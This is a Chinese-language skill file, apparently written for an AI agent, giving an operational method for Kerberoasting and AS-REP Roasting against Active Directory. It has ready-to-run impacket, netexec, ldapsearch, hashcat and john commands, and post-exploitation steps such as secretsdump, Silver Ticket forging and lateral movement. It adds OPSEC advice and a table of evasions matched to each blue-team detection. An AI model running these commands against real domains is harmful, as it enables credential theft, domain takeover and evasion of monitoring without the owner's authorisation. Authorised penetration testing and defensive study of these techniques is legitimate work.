---
name: kerberoast-attack
description: "Kerberoasting 与 AS-REP Roasting 完整攻击方法论。当拥有任意域用户凭据（Kerberoasting）或发现无需预认证的账户（AS-REP Roasting）时使用。覆盖 SPN 发现、票据请求、离线破解、AES vs RC4 策略选择"
metadata:
  tags: "kerberoast,asrep,kerberos,spn,tgs,hashcat,域攻击,票据,服务账户,离线破解"
  category: "lateral"
  mitre_attack: "T1558.003,T1558.004"
---

# Kerberoasting & AS-REP Roasting

> **核心价值**：以任意域用户权限获取高权限服务账户密码 → 无需提权即可达到域管级别

## ⛔ 深入参考

- Hashcat 破解模式与字典策略 → [references/hash-cracking.md](references/hash-cracking.md)
- 防御绕过与高级利用 → [references/advanced-kerberoast.md](references/advanced-kerberoast.md)

---

## Part A: Kerberoasting（需要任意域用户凭据）

### Phase 1: SPN 枚举

```bash
# impacket — 最推荐
impacket-GetUserSPNs DOMAIN/user:pass -dc-ip DC_IP -request

# netexec
netexec ldap DC_IP -u user -p pass --kerberoasting output.txt

# 纯 LDAP 查询
ldapsearch -H ldap://DC_IP -D "user@domain" -w "pass" \
  -b "DC=domain,DC=com" "(&(objectClass=user)(servicePrincipalName=*))" \
  sAMAccountName servicePrincipalName memberOf

# PowerShell（已在域内机器）
setspn -T domain -Q */*
# 或
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
```

### Phase 2: 票据请求策略

```
加密类型选择：
├─ RC4 (etype 23) → hashcat mode 13100 → 破解速度快 ⭐
├─ AES256 (etype 18) → hashcat mode 19700 → 破解速度慢 10x
└─ AES128 (etype 17) → hashcat mode 19600 → 中等

策略：
├─ 默认 impacket 请求 RC4 → 最快破解
├─ 如果目标强制 AES → 只能接受慢速破解
├─ ⛔ 域控可能监控 RC4 TGS 请求 → OPSEC 风险！
└─ AES 请求更隐蔽（正常行为），但破解慢
```

**OPSEC 考虑：**
```
# 隐蔽方式：请求 AES 加密票据（看起来更正常）
impacket-GetUserSPNs DOMAIN/user:pass -dc-ip DC_IP -request -outputfile hashes.txt

# 超隐蔽：只请求特定高价值 SPN（不枚举全部）
impacket-GetUserSPNs DOMAIN/user:pass -dc-ip DC_IP \
  -request -target-user svc_sql_admin

# ⛔ 避免：一次性请求所有 SPN 的票据 → 告警
```

### Phase 3: 离线破解

```bash
# Hashcat — GPU 破解
hashcat -m 13100 hashes.txt wordlist.txt           # RC4
hashcat -m 19700 hashes.txt wordlist.txt           # AES256
hashcat -m 13100 hashes.txt wordlist.txt -r rules/best64.rule  # 规则

# John the Ripper
john --format=krb5tgs hashes.txt --wordlist=wordlist.txt

# 字典选择优先级
├─ 1. 目标相关字典（公司名+年份+特殊字符）
├─ 2. rockyou.txt + 规则
├─ 3. 泄露密码库
└─ 4. 组合攻击（公司名 + 常见模式）
```

### Phase 4: 高价值目标识别

```
并非所有 SPN 账户都值得破解，优先级：

高价值（优先破解）：
├─ 账户是 Domain Admins / Enterprise Admins 成员
├─ 账户名含 "admin" / "svc" / "sql" / "backup"
├─ 账户有 AdminCount=1 属性
├─ 账户在 BloodHound 攻击路径上
└─ 账户密码策略宽松（无强制复杂度）

判断方法：
ldapsearch ... "(&(servicePrincipalName=*)(adminCount=1))" sAMAccountName
```

---

## Part B: AS-REP Roasting（无需凭据/需要用户列表）

### Phase 1: 发现无需预认证的用户

```bash
# 无需凭据 — 枚举无需预认证的用户
impacket-GetNPUsers DOMAIN/ -dc-ip DC_IP -usersfile users.txt \
  -format hashcat -outputfile asrep_hashes.txt

# 有凭据 — 查询所有无需预认证的用户
impacket-GetNPUsers DOMAIN/user:pass -dc-ip DC_IP -request

# LDAP 查询
ldapsearch -H ldap://DC_IP -D "user@domain" -w "pass" \
  -b "DC=domain,DC=com" \
  "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" \
  sAMAccountName

# netexec
netexec ldap DC_IP -u user -p pass --asreproast asrep.txt
```

### Phase 2: 破解 AS-REP 哈希

```bash
# hashcat mode 18200
hashcat -m 18200 asrep_hashes.txt wordlist.txt -r rules/best64.rule

# john
john --format=krb5asrep asrep_hashes.txt --wordlist=wordlist.txt
```

---

## Part C: 后利用 — 破解成功后

```
拿到服务账户密码后：
├─ 使用凭据横向移动
│   netexec smb TARGETS -u svc_account -p 'cracked_pass'
├─ 如果是 DA/高权限
│   impacket-secretsdump DOMAIN/svc_admin:pass@DC_IP
├─ 申请 Silver Ticket（不经过 DC 验证）
│   impacket-ticketer -nthash HASH -domain-sid S-1-5-... -domain DOMAIN -spn ...
└─ 添加 SPN 到已控账户 → Targeted Kerberoasting
    setspn -a http/fake svc_account  # 让其他人可以对你 Kerberoast
```

## 检测与规避对照

| 蓝队检测 | 红队对策 |
|----------|---------|
| 大量 TGS 请求 (EventID 4769) | 只请求高价值目标，不全量枚举 |
| RC4 降级检测 | 请求 AES256 票据（破解慢但隐蔽） |
| 蜜罐 SPN 账户 | 对比 BloodHound 数据，排除异常 SPN |
| 异常时间请求 | 业务时间操作 |
| 特定账户大量票据 | 分散请求时间 |

## 工具速查

| 工具 | 用途 |
|------|------|
| impacket-GetUserSPNs | Kerberoasting 票据请求 |
| impacket-GetNPUsers | AS-REP Roasting |
| netexec | 集成枚举与攻击 |
| Rubeus | Windows 端 Kerberoasting（含 OPSEC 选项） |
| hashcat | GPU 离线破解 |
| BloodHound | 识别高价值 SPN 账户 |

## 关联技能

- **AD 域攻击方法论** → `/skill:ad-domain-attack`
- **ADCS 证书攻击** → `/skill:adcs-certipy-attack`
- **Hashcat 破解** → `/skill:hashcat-crack`
- **NTLM 中继攻击** → `/skill:ntlm-relay-attack`
